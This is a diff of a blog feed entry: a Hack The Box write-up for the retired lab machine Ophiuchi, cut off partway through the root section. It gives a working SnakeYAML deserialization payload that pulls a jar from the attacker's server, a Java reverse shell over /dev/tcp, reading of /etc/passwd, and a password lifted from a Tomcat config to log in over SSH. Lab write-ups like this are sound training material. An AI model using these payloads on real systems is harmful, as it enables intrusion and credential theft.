@@ -1,5 +1,243 @@
 <?xml version="1.0" encoding="utf-8"?>
-<feed xmlns="http://www.w3.org/2005/Atom"><title>maggick's logs - security</title><link href="https://maggick.fr/" rel="alternate"></link><link href="https://maggick.fr/feeds/security.atom.xml" rel="self"></link><id>https://maggick.fr/</id><updated>2021-06-07T10:25:00+02:00</updated><entry><title>HTB: ScriptKiddie</title><link href="https://maggick.fr/2021/06/htb-scriptkiddie.html" rel="alternate"></link><published>2021-06-07T10:25:00+02:00</published><updated>2021-06-07T10:25:00+02:00</updated><author><name>maggick</name></author><id>tag:maggick.fr,2021-06-07:/2021/06/htb-scriptkiddie.html</id><summary type="html">&lt;p&gt;&lt;img alt="ScriptKiddie Card" class="align-left" src="/media/2021.06/sk_card.png" width="262"/&gt;&lt;/p&gt;
+<feed xmlns="http://www.w3.org/2005/Atom"><title>maggick's logs - security</title><link href="https://maggick.fr/" rel="alternate"></link><link href="https://maggick.fr/feeds/security.atom.xml" rel="self"></link><id>https://maggick.fr/</id><updated>2021-07-05T09:15:00+02:00</updated><entry><title>HTB: Ophiuchi</title><link href="https://maggick.fr/2021/07/htb-ophiuchi.html" rel="alternate"></link><published>2021-07-05T09:15:00+02:00</published><updated>2021-07-05T09:15:00+02:00</updated><author><name>maggick</name></author><id>tag:maggick.fr,2021-07-05:/2021/07/htb-ophiuchi.html</id><summary type="html">&lt;p&gt;&lt;img alt="Ophiuchi card" class="align-left" src="/media/2021.07/ophiuchi_card.png" width="262"/&gt;&lt;/p&gt;
+&lt;p&gt;This is a writeup about a retired HacktheBox machine:
+&lt;a href="https://www.hackthebox.eu/home/machines/profile/315"&gt;Ophiuchi&lt;/a&gt; created by
+&lt;a href="https://www.hackthebox.eu/home/users/profile/27390"&gt;felamos&lt;/a&gt; and publish on
+February 13, 2021.
+This box is classified as a medium machine. The user part involves YAML and
+deserialization as the root part involves webassembly binaries.&lt;/p&gt;
+</summary><content type="html">&lt;p&gt;&lt;img class="align-left" src="/media/2021.07/ophiuchi_card.png" alt="Ophiuchi card" width="262"&gt;&lt;/p&gt;
+&lt;p&gt;This is a writeup about a retired HacktheBox machine:
+&lt;a href="https://www.hackthebox.eu/home/machines/profile/315"&gt;Ophiuchi&lt;/a&gt; created by
+&lt;a href="https://www.hackthebox.eu/home/users/profile/27390"&gt;felamos&lt;/a&gt; and publish on
+February 13, 2021.
+This box is classified as a medium machine. The user part involves YAML and
+deserialization as the root part involves webassembly binaries.&lt;/p&gt;
+
+
+&lt;h1 id="user"&gt;User&lt;/h1&gt;
+&lt;h2 id="reco"&gt;Reco&lt;/h2&gt;
+&lt;p&gt;We start with an nmap scan. Only ports 22 (SSH) and 8080 (HTTP) are open.&lt;/p&gt;
+&lt;div class="highlight"&gt;&lt;pre&gt;&lt;span class="code-line"&gt;&lt;span&gt;&lt;/span&gt;&lt;code&gt;# Nmap 7.91 scan initiated Sat Feb 20 04:02:47 2021 as: nmap -oN notes -sS -p- 10.129.98.255&lt;/span&gt;
+&lt;span class="code-line"&gt;Nmap scan report for 10.129.98.255&lt;/span&gt;
+&lt;span class="code-line"&gt;Host is up (0.014s latency).&lt;/span&gt;
+&lt;span class="code-line"&gt;Not shown: 65533 closed ports&lt;/span&gt;
+&lt;span class="code-line"&gt;PORT     STATE SERVICE&lt;/span&gt;
+&lt;span class="code-line"&gt;22/tcp   open  ssh&lt;/span&gt;
+&lt;span class="code-line"&gt;8080/tcp open  http-proxy&lt;/span&gt;
+&lt;span class="code-line"&gt;&lt;/span&gt;
+&lt;span class="code-line"&gt;# Nmap done at Sat Feb 20 04:03:22 2021 -- 1 IP address (1 host up) scanned in 35.41 seconds&lt;/span&gt;
+&lt;span class="code-line"&gt;&lt;/code&gt;&lt;/pre&gt;&lt;/div&gt;
+
+&lt;h2 id="web"&gt;Web&lt;/h2&gt;
+&lt;p&gt;The web page is an Online YAML Parser. We quickly guess that this would be about
+YAML deserialization. A few "random" data generate a Java stack trace indicating
+the use of the Snake YAML library.&lt;/p&gt;
+&lt;p&gt;A Google search lead us to a
+&lt;a href="https://medium.com/@swapneildash/snakeyaml-deserilization-exploited-b4a2c5ac0858"&gt;medium article about exploiting YAML deserialization&lt;/a&gt;&lt;/p&gt;
+&lt;p&gt;We run an python http server and use the following payload&lt;/p&gt;
+&lt;div class="highlight"&gt;&lt;pre&gt;&lt;span class="code-line"&gt;&lt;span&gt;&lt;/span&gt;&lt;code&gt;!!javax.script.ScriptEngineManager [&lt;/span&gt;
+&lt;span class="code-line"&gt;  !!java.net.URLClassLoader [[&lt;/span&gt;
+&lt;span class="code-line"&gt;    !!java.net.URL [&amp;quot;http://10.10.14.16:8000&amp;quot;]&lt;/span&gt;
+&lt;span class="code-line"&gt;  ]]&lt;/span&gt;
+&lt;span class="code-line"&gt;]&lt;/span&gt;
+&lt;span class="code-line"&gt;&lt;/code&gt;&lt;/pre&gt;&lt;/div&gt;
+
+&lt;p&gt;Despite the "error" message on the website we still got a hit on our Python
+HTTP server.&lt;/p&gt;
+&lt;div class="highlight"&gt;&lt;pre&gt;&lt;span class="code-line"&gt;&lt;span&gt;&lt;/span&gt;&lt;code&gt;$ python3 -m http.server&lt;/span&gt;
+&lt;span class="code-line"&gt;Serving HTTP on 0.0.0.0 port 8000 (http://0.0.0.0:8000/) ...&lt;/span&gt;
+&lt;span class="code-line"&gt;10.129.98.255 - - [20/Feb/2021 04:25:51] &amp;quot;GET / HTTP/1.1&amp;quot; 200 -&lt;/span&gt;
+&lt;span class="code-line"&gt;&lt;/code&gt;&lt;/pre&gt;&lt;/div&gt;
+
+&lt;p&gt;A link in the &lt;a href="https://medium.com/@swapneildash/snakeyaml-deserilization-exploited-b4a2c5ac0858"&gt;medium article&lt;/a&gt;
+lead us to a &lt;a href="https://github.com/artsploit/yaml-payload"&gt;github repository for a YAML payloads generator&lt;/a&gt;.&lt;/p&gt;
+&lt;p&gt;We change the paylaod to &lt;code&gt;Runtime.getRuntime().exec("wget http://10.10.14.16:8000/boom");&lt;/code&gt;
+and send it to the YAML parser&lt;/p&gt;
+&lt;div class="highlight"&gt;&lt;pre&gt;&lt;span class="code-line"&gt;&lt;span&gt;&lt;/span&gt;&lt;code&gt;!!javax.script.ScriptEngineManager [&lt;/span&gt;
+&lt;span class="code-line"&gt;  !!java.net.URLClassLoader [[&lt;/span&gt;
+&lt;span class="code-line"&gt;    !!java.net.URL [&amp;quot;http://10.10.14.16:8000/yaml-payload.jar&amp;quot;]&lt;/span&gt;
+&lt;span class="code-line"&gt;  ]]&lt;/span&gt;
+&lt;span class="code-line"&gt;]&lt;/span&gt;
+&lt;span class="code-line"&gt;&lt;/code&gt;&lt;/pre&gt;&lt;/div&gt;
+
+&lt;p&gt;We got an other Java error "java.lang.UnsupportedClassVersionError: artsploit/AwesomeScriptEngineFactory has been compiled by a more recent version of the Java Runtime (class file version 60.0), this version of the Java Runtime only recognizes class file versions up to 55.0".&lt;/p&gt;
+&lt;p&gt;On my Kali Linux I am using &lt;code&gt;openjdk&lt;/code&gt; with Java 16 so our &lt;code&gt;javac&lt;/code&gt; produced a
+newer version of the code.&lt;/p&gt;
+&lt;div class="highlight"&gt;&lt;pre&gt;&lt;span class="code-line"&gt;&lt;span&gt;&lt;/span&gt;&lt;code&gt;/usr/lib/jvm/java-16-openjdk-amd64/bin/javac&lt;/span&gt;
+&lt;span class="code-line"&gt;&lt;/code&gt;&lt;/pre&gt;&lt;/div&gt;
+
+&lt;p&gt;We just install Java 11 using &lt;code&gt;sudo apt-get install openjdk-11-jdk&lt;/code&gt;
+and run the specific Java 11 compiler. Then we got a hit with our "second" payload&lt;/p&gt;
+&lt;div class="highlight"&gt;&lt;pre&gt;&lt;span class="code-line"&gt;&lt;span&gt;&lt;/span&gt;&lt;code&gt;kali@kali:~/pown/htb_Ophiuchi/yaml-payload$ /usr/lib/jvm/java-11-openjdk-amd64/bin/javac src/artsploit/AwesomeScriptEngineFactory.java&lt;/span&gt;
+&lt;span class="code-line"&gt;Picked up _JAVA_OPTIONS: -Dawt.useSystemAAFontSettings=on -Dswing.aatext=true&lt;/span&gt;
+&lt;span class="code-line"&gt;kali@kali:~/pown/htb_Ophiuchi/yaml-payload$ jar -cvf yaml-payload.jar -C src/ .&lt;/span&gt;
+&lt;span class="code-line"&gt;Picked up _JAVA_OPTIONS: -Dawt.useSystemAAFontSettings=on -Dswing.aatext=true&lt;/span&gt;
+&lt;span class="code-line"&gt;added manifest&lt;/span&gt;
+&lt;span class="code-line"&gt;adding: artsploit/(in = 0) (out= 0)(stored 0%)&lt;/span&gt;
+&lt;span class="code-line"&gt;adding: artsploit/AwesomeScriptEngineFactory.class(in = 1620) (out= 680)(deflated 58%)&lt;/span&gt;
+&lt;span class="code-line"&gt;adding: artsploit/AwesomeScriptEngineFactory.java(in = 1493) (out= 404)(deflated 72%)&lt;/span&gt;
+&lt;span class="code-line"&gt;ignoring entry META-INF/&lt;/span&gt;
+&lt;span class="code-line"&gt;adding: META-INF/services/(in = 0) (out= 0)(stored 0%)&lt;/span&gt;
+&lt;span class="code-line"&gt;adding: META-INF/services/javax.script.ScriptEngineFactory(in = 36) (out= 38)(deflated -5%)&lt;/span&gt;
+&lt;span class="code-line"&gt;kali@kali:~/pown/htb_Ophiuchi/yaml-payload$ python3 -m http.server&lt;/span&gt;
+&lt;span class="code-line"&gt;Serving HTTP on 0.0.0.0 port 8000 (http://0.0.0.0:8000/) ...&lt;/span&gt;
+&lt;span class="code-line"&gt;10.129.98.255 - - [20/Feb/2021 04:47:15] &amp;quot;GET /yaml-payload.jar HTTP/1.1&amp;quot; 200 -&lt;/span&gt;
+&lt;span class="code-line"&gt;10.129.98.255 - - [20/Feb/2021 04:47:15] &amp;quot;GET /yaml-payload.jar HTTP/1.1&amp;quot; 200 -&lt;/span&gt;
+&lt;span class="code-line"&gt;10.129.98.255 - - [20/Feb/2021 04:47:15] code 404, message File not found&lt;/span&gt;
+&lt;span class="code-line"&gt;10.129.98.255 - - [20/Feb/2021 04:47:15] &amp;quot;GET /boom HTTP/1.1&amp;quot; 404 -&lt;/span&gt;
+&lt;span class="code-line"&gt;&lt;/code&gt;&lt;/pre&gt;&lt;/div&gt;
+
+&lt;p&gt;We modify it to use the reverse shell Java payload from
+&lt;a href="https://github.com/swisskyrepo/PayloadsAllTheThings/blob/master/Methodology%20and%20Resources/Reverse%20Shell%20Cheatsheet.md#java"&gt;Payload all the things&lt;/a&gt;
+and catch the new exception in the Java code as shown in the code block below.&lt;/p&gt;
+&lt;div class="highlight"&gt;&lt;pre&gt;&lt;span class="code-line"&gt;&lt;span&gt;&lt;/span&gt;&lt;code&gt;&lt;span class="kd"&gt;public&lt;/span&gt; &lt;span class="nf"&gt;AwesomeScriptEngineFactory&lt;/span&gt;&lt;span class="p"&gt;()&lt;/span&gt; &lt;span class="p"&gt;{&lt;/span&gt;&lt;/span&gt;
+&lt;span class="code-line"&gt;    &lt;span class="k"&gt;try&lt;/span&gt; &lt;span class="p"&gt;{&lt;/span&gt;&lt;/span&gt;
+&lt;span class="code-line"&gt;        &lt;span class="n"&gt;Runtime&lt;/span&gt; &lt;span class="n"&gt;r&lt;/span&gt; &lt;span class="o"&gt;=&lt;/span&gt; &lt;span class="n"&gt;Runtime&lt;/span&gt;&lt;span class="p"&gt;.&lt;/span&gt;&lt;span class="na"&gt;getRuntime&lt;/span&gt;&lt;span class="p"&gt;();&lt;/span&gt;&lt;/span&gt;
+&lt;span class="code-line"&gt;        &lt;span class="n"&gt;Process&lt;/span&gt; &lt;span class="n"&gt;p&lt;/span&gt; &lt;span class="o"&gt;=&lt;/span&gt; &lt;span class="n"&gt;r&lt;/span&gt;&lt;span class="p"&gt;.&lt;/span&gt;&lt;span class="na"&gt;exec&lt;/span&gt;&lt;span class="p"&gt;(&lt;/span&gt;&lt;span class="k"&gt;new&lt;/span&gt; &lt;span class="n"&gt;String&lt;/span&gt;&lt;span class="o"&gt;[]&lt;/span&gt; &lt;span class="p"&gt;{&lt;/span&gt; &lt;span class="s"&gt;&amp;quot;/bin/bash&amp;quot;&lt;/span&gt;&lt;span class="p"&gt;,&lt;/span&gt; &lt;span class="s"&gt;&amp;quot;-c&amp;quot;&lt;/span&gt;&lt;span class="p"&gt;,&lt;/span&gt; &lt;span class="s"&gt;&amp;quot;exec 5&amp;lt;&amp;gt;/dev/tcp/10.10.14.16/4242;cat &amp;lt;&amp;amp;5 | while read line; do $line 2&amp;gt;&amp;amp;5 &amp;gt;&amp;amp;5; done&amp;quot;&lt;/span&gt; &lt;span class="p"&gt;});&lt;/span&gt;&lt;/span&gt;
+&lt;span class="code-line"&gt;        &lt;span class="n"&gt;p&lt;/span&gt;&lt;span class="p"&gt;.&lt;/span&gt;&lt;span class="na"&gt;waitFor&lt;/span&gt;&lt;span class="p"&gt;();&lt;/span&gt;&lt;/span&gt;
+&lt;span class="code-line"&gt;    &lt;span class="p"&gt;}&lt;/span&gt; &lt;span class="k"&gt;catch&lt;/span&gt; &lt;span class="p"&gt;(&lt;/span&gt;&lt;span class="n"&gt;IOException&lt;/span&gt; &lt;span class="o"&gt;|&lt;/span&gt; &lt;span class="n"&gt;InterruptedException&lt;/span&gt; &lt;span class="n"&gt;e&lt;/span&gt;&lt;span class="p"&gt;)&lt;/span&gt; &lt;span class="p"&gt;{&lt;/span&gt;&lt;/span&gt;
+&lt;span class="code-line"&gt;        &lt;span class="n"&gt;e&lt;/span&gt;&lt;span class="p"&gt;.&lt;/span&gt;&lt;span class="na"&gt;printStackTrace&lt;/span&gt;&lt;span class="p"&gt;();&lt;/span&gt;&lt;/span&gt;
+&lt;span class="code-line"&gt;    &lt;span class="p"&gt;}&lt;/span&gt;&lt;/span&gt;
+&lt;span class="code-line"&gt;&lt;span class="p"&gt;}&lt;/span&gt;&lt;/span&gt;
+&lt;span class="code-line"&gt;&lt;/code&gt;&lt;/pre&gt;&lt;/div&gt;
+
+&lt;p&gt;Running it give us a reverse shell as the &lt;code&gt;tomcat&lt;/code&gt; user.&lt;/p&gt;
+&lt;div class="highlight"&gt;&lt;pre&gt;&lt;span class="code-line"&gt;&lt;span&gt;&lt;/span&gt;&lt;code&gt;$ nc -l -p 4242&lt;/span&gt;
+&lt;span class="code-line"&gt;id&lt;/span&gt;
+&lt;span class="code-line"&gt;uid=1001(tomcat) gid=1001(tomcat) groups=1001(tomcat)&lt;/span&gt;
+&lt;span class="code-line"&gt;&lt;/code&gt;&lt;/pre&gt;&lt;/div&gt;
+
+&lt;h2 id="stored-credential"&gt;Stored credential&lt;/h2&gt;
+&lt;p&gt;We start enumerating and found out that the user is probably &lt;code&gt;admin&lt;/code&gt;.&lt;/p&gt;
+&lt;div class="highlight"&gt;&lt;pre&gt;&lt;span class="code-line"&gt;&lt;span&gt;&lt;/span&gt;&lt;code&gt;cat /etc/passwd&lt;/span&gt;
+&lt;span class="code-line"&gt;root:x:0:0:root:/root:/bin/bash&lt;/span&gt;
+&lt;span class="code-line"&gt;daemon:x:1:1:daemon:/usr/sbin:/usr/sbin/nologin&lt;/span&gt;
+&lt;span class="code-line"&gt;&amp;lt;SNIP&amp;gt;&lt;/span&gt;
+&lt;span class="code-line"&gt;systemd-coredump:x:999:999:systemd Core Dumper:/:/usr/sbin/nologin&lt;/span&gt;
+&lt;span class="code-line"&gt;lxd:x:998:100::/var/snap/lxd/common/lxd:/bin/false&lt;/span&gt;
+&lt;span class="code-line"&gt;tomcat:x:1001:1001::/opt/tomcat:/bin/false&lt;/span&gt;
+&lt;span class="code-line"&gt;admin:x:1000:1000:,,,:/home/admin:/bin/bash&lt;/span&gt;
+&lt;span class="code-line"&gt;&lt;/code&gt;&lt;/pre&gt;&lt;/div&gt;
+
+&lt;p&gt;When looking at the directories, we found a &lt;code&gt;conf&lt;/code&gt; folder containing the
+&lt;code&gt;tomcat-users.xml&lt;/code&gt; file. This file classically store the user that can access
+the tomcat manager panel (which is not exposed on this box).&lt;/p&gt;
+&lt;div class="highlight"&gt;&lt;pre&gt;&lt;span class="code-line"&gt;&lt;span&gt;&lt;/span&gt;&lt;code&gt;ls -alR conf&lt;/span&gt;
+&lt;span class="code-line"&gt;conf:&lt;/span&gt;
+&lt;span class="code-line"&gt;total 240&lt;/span&gt;
+&lt;span class="code-line"&gt;drwxr-x--- 2 root tomcat   4096 Dec 28 00:37 .&lt;/span&gt;
+&lt;span class="code-line"&gt;drwxr-xr-x 9 root tomcat   4096 Oct 11 14:07 ..&lt;/span&gt;
+&lt;span class="code-line"&gt;-rw-r----- 1 root tomcat  12873 Sep 10 08:25 catalina.policy&lt;/span&gt;
+&lt;span class="code-line"&gt;-rw-r----- 1 root tomcat   7262 Sep 10 08:25 catalina.properties&lt;/span&gt;
+&lt;span class="code-line"&gt;-rw-r----- 1 root tomcat   1400 Sep 10 08:25 context.xml&lt;/span&gt;
+&lt;span class="code-line"&gt;-rw-r----- 1 root tomcat   1149 Sep 10 08:25 jaspic-providers.xml&lt;/span&gt;
+&lt;span class="code-line"&gt;-rw-r----- 1 root tomcat   2313 Sep 10 08:25 jaspic-providers.xsd&lt;/span&gt;
+&lt;span class="code-line"&gt;-rw-r----- 1 root tomcat   4144 Sep 10 08:25 logging.properties&lt;/span&gt;
+&lt;span class="code-line"&gt;-rw-r----- 1 root tomcat   7588 Sep 10 08:25 server.xml&lt;/span&gt;
+&lt;span class="code-line"&gt;-rw-r----- 1 root tomcat   2234 Dec 28 00:37 tomcat-users.xml&lt;/span&gt;
+&lt;span class="code-line"&gt;-rw-r----- 1 root tomcat   2558 Sep 10 08:25 tomcat-users.xsd&lt;/span&gt;
+&lt;span class="code-line"&gt;-rw-r----- 1 root tomcat 172359 Sep 10 08:25 web.xml&lt;/span&gt;
+&lt;span class="code-line"&gt;&lt;/code&gt;&lt;/pre&gt;&lt;/div&gt;
+
+&lt;p&gt;We look at the file and found a few default username and passwords and also the
+&lt;code&gt;admin&lt;/code&gt; user with the &lt;code&gt;whythereisalimit&lt;/code&gt; password.&lt;/p&gt;
+&lt;div class="highlight"&gt;&lt;pre&gt;&lt;span class="code-line"&gt;&lt;span&gt;&lt;/span&gt;&lt;code&gt;cat conf/tomcat*&lt;/span&gt;
+&lt;span class="code-line"&gt;&amp;lt;?xml version=&amp;quot;1.0&amp;quot; encoding=&amp;quot;UTF-8&amp;quot;?&amp;gt;&lt;/span&gt;
+&lt;span class="code-line"&gt;&amp;lt;!--&lt;/span&gt;
+&lt;span class="code-line"&gt;&amp;lt;SNIP&amp;gt;&lt;/span&gt;
+&lt;span class="code-line"&gt;&amp;lt;tomcat-users xmlns=&amp;quot;http://tomcat.apache.org/xml&amp;quot;&lt;/span&gt;
+&lt;span class="code-line"&gt;              xmlns:xsi=&amp;quot;http://www.w3.org/2001/XMLSchema-instance&amp;quot;&lt;/span&gt;
+&lt;span class="code-line"&gt;              xsi:schemaLocation=&amp;quot;http://tomcat.apache.org/xml tomcat-users.xsd&amp;quot;&lt;/span&gt;
+&lt;span class="code-line"&gt;        version=&amp;quot;1.0&amp;quot;&amp;gt;&lt;/span&gt;
+&lt;span class="code-line"&gt;&amp;lt;user username=&amp;quot;admin&amp;quot; password=&amp;quot;whythereisalimit&amp;quot; roles=&amp;quot;manager-gui,admin-gui&amp;quot;/&amp;gt;&lt;/span&gt;
+&lt;span class="code-line"&gt;SNIP&amp;gt;&lt;/span&gt;
+&lt;span class="code-line"&gt;&amp;lt;!--&lt;/span&gt;
+&lt;span class="code-line"&gt;  &amp;lt;role rolename=&amp;quot;tomcat&amp;quot;/&amp;gt;&lt;/span&gt;
+&lt;span class="code-line"&gt;  &amp;lt;role rolename=&amp;quot;role1&amp;quot;/&amp;gt;&lt;/span&gt;
+&lt;span class="code-line"&gt;  &amp;lt;user username=&amp;quot;tomcat&amp;quot; password=&amp;quot;&amp;lt;must-be-changed&amp;gt;&amp;quot; roles=&amp;quot;tomcat&amp;quot;/&amp;gt;&lt;/span&gt;
+&lt;span class="code-line"&gt;  &amp;lt;user username=&amp;quot;both&amp;quot; password=&amp;quot;&amp;lt;must-be-changed&amp;gt;&amp;quot; roles=&amp;quot;tomcat,role1&amp;quot;/&amp;gt;&lt;/span&gt;
+&lt;span class="code-line"&gt;  &amp;lt;user username=&amp;quot;role1&amp;quot; password=&amp;quot;&amp;lt;must-be-changed&amp;gt;&amp;quot; roles=&amp;quot;role1&amp;quot;/&amp;gt;&lt;/span&gt;
+&lt;span class="code-line"&gt;--&amp;gt;&lt;/span&gt;
+&lt;span class="code-line"&gt;&amp;lt;SNIP&amp;gt;&lt;/span&gt;
+&lt;span class="code-line"&gt;&lt;/code&gt;&lt;/pre&gt;&lt;/div&gt;
+
+&lt;p&gt;We connect to the box with SSH using this user and got the first flag.&lt;/p&gt;
+&lt;div class="highlight"&gt;&lt;pre&gt;&lt;span class="code-line"&gt;&lt;span&gt;&lt;/span&gt;&lt;code&gt;kali@kali:~$ #whythereisalimit&lt;/span&gt;
+&lt;span class="code-line"&gt;kali@kali:~$ ssh admin@10.129.98.255&lt;/span&gt;
+&lt;span class="code-line"&gt;admin@10.129.98.255&amp;#39;s password:&lt;/span&gt;
+&lt;span class="code-line"&gt;Welcome to Ubuntu 20.04 LTS (GNU/Linux 5.4.0-51-generic x86_64)&lt;/span&gt;
+&lt;span class="code-line"&gt;&amp;lt;SNIP&amp;gt;&lt;/span&gt;
+&lt;span class="code-line"&gt;admin@ophiuchi:~$ id&lt;/span&gt;
+&lt;span class="code-line"&gt;uid=1000(admin) gid=1000(admin) groups=1000(admin)&lt;/span&gt;
+&lt;span class="code-line"&gt;admin@ophiuchi:~$ cat user.txt&lt;/span&gt;
+&lt;span class="code-line"&gt;6aa83180b3e469e3f5de725c639a601b&lt;/span&gt;
+&lt;span class="code-line"&gt;&lt;/code&gt;&lt;/pre&gt;&lt;/div&gt;
+
+&lt;h1 id="root"&gt;Root&lt;/h1&gt;
+&lt;p&gt;We enumerate the box and quickly found out that we can execute a specific go
+program as root without password.&lt;/p&gt;
+&lt;div class="highlight"&gt;&lt;pre&gt;&lt;span class="code-line"&gt;&lt;span&gt;&lt;/span&gt;&lt;code&gt;admin@ophiuchi:~$ sudo -l&lt;/span&gt;
+&lt;span class="code-line"&gt;Matching Defaults entries for admin on ophiuchi:&lt;/span&gt;
+&lt;span class="code-line"&gt;    env_reset, mail_badpass, secure_path=/usr/local/sbin\:/usr/local/bin\:/usr/sbin\:/usr/bin\:/sbin\:/bin\:/snap/bin&lt;/span&gt;
+&lt;span class="code-line"&gt;&lt;/span&gt;
+&lt;span class="code-line"&gt;User admin may run the following commands on ophiuchi:&lt;/span&gt;
+&lt;span class="code-line"&gt;    (ALL) NOPASSWD: /usr/bin/go run /opt/wasm-functions/index.go&lt;/span&gt;
+&lt;span class="code-line"&gt;&lt;/code&gt;&lt;/pre&gt;&lt;/div&gt;
+
+&lt;p&gt;The content of the "index.go" file is the following:&lt;/p&gt;
+&lt;div class="highlight"&gt;&lt;pre&gt;&lt;span class="code-line"&gt;&lt;span&gt;&lt;/span&gt;&lt;code&gt;&lt;span class="n"&gt;package&lt;/span&gt; &lt;span class="n"&gt;main&lt;/span&gt;&lt;/span&gt;
+&lt;span class="code-line"&gt;&lt;/span&gt;
+&lt;span class="code-line"&gt;&lt;span class="kn"&gt;import&lt;/span&gt; &lt;span class="p"&gt;(&lt;/span&gt;&lt;/span&gt;
+&lt;span class="code-line"&gt;        &lt;span class="s2"&gt;&amp;quot;fmt&amp;quot;&lt;/span&gt;&lt;/span&gt;
+&lt;span class="code-line"&gt;        &lt;span class="n"&gt;wasm&lt;/span&gt; &lt;span class="s2"&gt;&amp;quot;github.com/wasmerio/wasmer-go/wasmer&amp;quot;&lt;/span&gt;&lt;/span&gt;
+&lt;span class="code-line"&gt;        &lt;span class="s2"&gt;&amp;quot;os/exec&amp;quot;&lt;/span&gt;&lt;/span&gt;
+&lt;span class="code-line"&gt;        &lt;span class="s2"&gt;&amp;quot;log&amp;quot;&lt;/span&gt;&lt;/span&gt;
+&lt;span class="code-line"&gt;&lt;span class="p"&gt;)&lt;/span&gt;&lt;/span&gt;
+&lt;span class="code-line"&gt;&lt;/span&gt;
+&lt;span class="code-line"&gt;&lt;/span&gt;
+&lt;span class="code-line"&gt;&lt;span class="n"&gt;func&lt;/span&gt; &lt;span class="n"&gt;main&lt;/span&gt;&lt;span class="p"&gt;()&lt;/span&gt; &lt;span class="p"&gt;{&lt;/span&gt;&lt;/span&gt;
+&lt;span class="code-line"&gt;        &lt;span class="nb"&gt;bytes&lt;/span&gt;&lt;span class="p"&gt;,&lt;/span&gt; &lt;span class="n"&gt;_&lt;/span&gt; &lt;span class="o"&gt;:=&lt;/span&gt; &lt;span class="n"&gt;wasm&lt;/span&gt;&lt;span class="o"&gt;.&lt;/span&gt;&lt;span class="n"&gt;ReadBytes&lt;/span&gt;&lt;span class="p"&gt;(&lt;/span&gt;&lt;span class="s2"&gt;&amp;quot;main.wasm&amp;quot;&lt;/span&gt;&lt;span class="p"&gt;)&lt;/span&gt;&lt;/span&gt;
+&lt;span class="code-line"&gt;&lt;/span&gt;
+&lt;span class="code-line"&gt;        &lt;span class="n"&gt;instance&lt;/span&gt;&lt;span class="p"&gt;,&lt;/span&gt; &lt;span class="n"&gt;_&lt;/span&gt; &lt;span class="o"&gt;:=&lt;/span&gt; &lt;span class="n"&gt;wasm&lt;/span&gt;&lt;span class="o"&gt;.&lt;/span&gt;&lt;span class="n"&gt;NewInstance&lt;/span&gt;&lt;span class="p"&gt;(&lt;/span&gt;&lt;span class="nb"&gt;bytes&lt;/span&gt;&lt;span class="p"&gt;)&lt;/span&gt;&lt;/span&gt;
+&lt;span class="code-line"&gt;        &lt;span class="n"&gt;defer&lt;/span&gt; &lt;span class="n"&gt;instance&lt;/span&gt;&lt;span class="o"&gt;.&lt;/span&gt;&lt;span class="n"&gt;Close&lt;/span&gt;&lt;span class="p"&gt;()&lt;/span&gt;&lt;/span&gt;
+&lt;span class="code-line"&gt;        &lt;span class="n"&gt;init&lt;/span&gt; &lt;span class="o"&gt;:=&lt;/span&gt; &lt;span class="n"&gt;instance&lt;/span&gt;&lt;span class="o"&gt;.&lt;/span&gt;&lt;span class="n"&gt;Exports&lt;/span&gt;&lt;span class="p"&gt;[&lt;/span&gt;&lt;span class="s2"&gt;&amp;quot;info&amp;quot;&lt;/span&gt;&lt;span class="p"&gt;]&lt;/span&gt;&lt;/span&gt;
+&lt;span class="code-line"&gt;        &lt;span class="n"&gt;result&lt;/span&gt;&lt;span class="p"&gt;,&lt;/span&gt;&lt;span class="n"&gt;_&lt;/span&gt; &lt;span class="o"&gt;:=&lt;/span&gt; &lt;span class="n"&gt;init&lt;/span&gt;&lt;span class="p"&gt;()&lt;/span&gt;&lt;/span&gt;
+&lt;span class="code-line"&gt;        &lt;span class="n"&gt;f&lt;/span&gt; &lt;span class="o"&gt;:=&lt;/span&gt; &lt;span class="n"&gt;result&lt;/span&gt;&lt;span class="o"&gt;.&lt;/span&gt;&lt;span class="n"&gt;String&lt;/span&gt;&lt;span class="p"&gt;()&lt;/span&gt;&lt;/span&gt;
+&lt;span class="code-line"&gt;        &lt;span class="k"&gt;if&lt;/span&gt; &lt;span class="p"&gt;(&lt;/span&gt;&lt;span class="n"&gt;f&lt;/span&gt; &lt;span class="o"&gt;!=&lt;/span&gt; &lt;span class="s2"&gt;&amp;quot;1&amp;quot;&lt;/span&gt;&lt;span class="p"&gt;)&lt;/span&gt; &lt;span class="p"&gt;{&lt;/span&gt;&lt;/span&gt;
+&lt;span class="code-line"&gt;                &lt;span class="n"&gt;fmt&lt;/span&gt;&lt;span class="o"&gt;.&lt;/span&gt;&lt;span class="n"&gt;Println&lt;/span&gt;&lt;span class="p"&gt;(&lt;/span&gt;&lt;span class="s2"&gt;&amp;quot;Not ready to deploy&amp;quot;&lt;/span&gt;&lt;span class="p"&gt;)&lt;/span&gt;&lt;/span&gt;
+&lt;span class="code-line"&gt;        &lt;span class="p"&gt;}&lt;/span&gt; &lt;span class="k"&gt;else&lt;/span&gt; &lt;span class="p"&gt;{&lt;/span&gt;&lt;/span&gt;
+&lt;span class="code-line"&gt;                &lt;span class="n"&gt;fmt&lt;/span&gt;&lt;span class="o"&gt;.&lt;/span&gt;&lt;span class="n"&gt;Println&lt;/span&gt;&lt;span class="p"&gt;(&lt;/span&gt;&lt;span class="s2"&gt;&amp;quot;Ready to deploy&amp;quot;&lt;/span&gt;&lt;span class="p"&gt;)&lt;/span&gt;&lt;/span&gt;
+&lt;span class="code-line"&gt;                &lt;span class="n"&gt;out&lt;/span&gt;&lt;span class="p"&gt;,&lt;/span&gt; &lt;span class="n"&gt;err&lt;/span&gt; &lt;span class="o"&gt;:=&lt;/span&gt; &lt;span class="n"&gt;exec&lt;/span&gt;&lt;span class="o"&gt;.&lt;/span&gt;&lt;span class="n"&gt;Command&lt;/span&gt;&lt;span class="p"&gt;(&lt;/span&gt;&lt;span class="s2"&gt;&amp;quot;/bin/sh&amp;quot;&lt;/span&gt;&lt;span class="p"&gt;,&lt;/span&gt; &lt;span class="s2"&gt;&amp;quot;deploy.sh&amp;quot;&lt;/span&gt;&lt;span class="p"&gt;)&lt;/span&gt;&lt;span class="o"&gt;.&lt;/span&gt;&lt;span class="n"&gt;Output&lt;/span&gt;&lt;span class="p"&gt;()&lt;/span&gt;&lt;/span&gt;
+&lt;span class="code-line"&gt;                &lt;span class="k"&gt;if&lt;/span&gt; &lt;span class="n"&gt;err&lt;/span&gt; &lt;span class="o"&gt;!=&lt;/span&gt; &lt;span class="n"&gt;nil&lt;/span&gt; &lt;span class="p"&gt;{&lt;/span&gt;&lt;/span&gt;
